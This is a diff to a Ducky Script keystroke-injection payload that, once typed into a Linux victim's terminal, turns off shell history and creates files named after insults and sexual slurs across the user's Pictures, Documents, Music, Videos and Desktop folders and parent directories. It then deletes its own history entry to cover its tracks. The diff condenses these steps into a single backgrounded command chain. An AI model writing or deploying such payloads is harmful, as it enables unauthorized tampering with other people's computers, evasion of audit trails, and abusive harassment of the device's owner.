@@ -19,72 +19,13 @@ STRING set +o history
 DELAY 200
 ENTER
 DELAY 200
-STRING cd /Home/Pictures
-DELAY 200
-ENTER
-DELAY 200
-STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick
-DELAY 300
-ENTER
+STRING nohup cd /Home/Pictures && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Documents && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Music && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Videos && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd /Home/Desktop && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line &
 DELAY 500
-STRING cd /Home/Documents
-DELAY 200
 ENTER
-DELAY 200
-STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick
 DELAY 300
-ENTER
+CTRL c
 DELAY 500
-STRING cd /Home/Music
-DELAY 200
-ENTER
-DELAY 200
-STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick
-DELAY 300
-ENTER
-DELAY 500
-STRING cd /Home/Videos
-DELAY 200
-ENTER
-DELAY 200
-STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick
-DELAY 300
-ENTER
-DELAY 500
-STRING cd /Home/Desktop
-DELAY 200
-ENTER
-DELAY 200
-STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick
-DELAY 300
-ENTER
-STRING cd ..
-DELAY 200
-ENTER
-DELAY 200
-STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick
-DELAY 300
-ENTER
-DELAY 500
-STRING cd ..
-DELAY 200
-ENTER
-DELAY 200
-STRING touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick
-DELAY 300
-ENTER
-DELAY 500
-REM sneak +1 cover your tracks
-STRING history | grep history
-DELAY 200
-ENTER
-STRING line=$(history | grep history | awk '{ print $1 }')
-DELAY 200
-ENTER
-STRING history -d $line
-DELAY 200
-ENTER
-DELAY 200
+CTRL c
 STRING set -o history && exit
 DELAY 200
 ENTER
